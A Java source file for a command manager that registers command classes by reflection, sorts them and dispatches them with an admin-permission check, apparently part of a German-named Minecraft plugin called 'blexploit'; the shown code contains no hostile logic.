package de.blexploit.command;

import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

import api.ClassFinder;
import api.Fehler;
import de.blexploit.command.cmds.Deop;
import de.blexploit.players.create.MittrollerEntity;

public final class CommandManager {

	public static ArrayList<Command> Commands = new ArrayList<Command>();

	public CommandManager() {
		this.init();
		Collections.sort(Commands, new Comparator<Command>() {

			@Override
			public int compare(Command o1, Command o2) {
				return o1.getCommand().compareTo(o2.getCommand());
			}
		});
	}

	private void Reg(Command c) {
		Commands.add(c);
	}

	public void init() {
		List<Class<?>> classes;
		ArrayList<Command> aitems = new ArrayList<Command>();
		List<String> displaynames = new ArrayList<String>();
		try {
			classes = ClassFinder.getClassesInSamePackage(Deop.class);
			for (Class<?> c : classes) {
				Type intfs = c.getGenericSuperclass();
				if (intfs.equals(de.blexploit.command.Command.class)) {
					@SuppressWarnings("unchecked")
					Class<Command> ii = (Class<Command>) c;
					@SuppressWarnings("deprecation")
					Command iv = ii.newInstance();
					aitems.add(iv);
					displaynames.add(iv.getCommand());
				}
			}
			java.util.Collections.sort(displaynames);
			for (String s : displaynames) {
				for (Command inv : aitems) {
					if (s.equals(inv.getCommand())) {
						this.Reg(inv);
					}
				}
			}
		} catch (ClassNotFoundException e) {
		} catch (InstantiationException e) {
		} catch (IllegalAccessException e) {
		} catch (Exception e) {
		}
	}

	public boolean RunCommand(String CMD, String[] args, MittrollerEntity mt) {
		boolean exist = false;
		for (Command cmd : Commands) {
			if (cmd.getCommand().toLowerCase().equals(CMD.toLowerCase())) {
				if (cmd.isNeedadmin()) {
					if (mt.isAdmin() == false) {
						mt.fehler(Fehler.NO_PERMISSIONS);
						return true;
					}
				}
				cmd.run(args, mt);
				exist = true;
			}
		}
		return exist;
	}

}
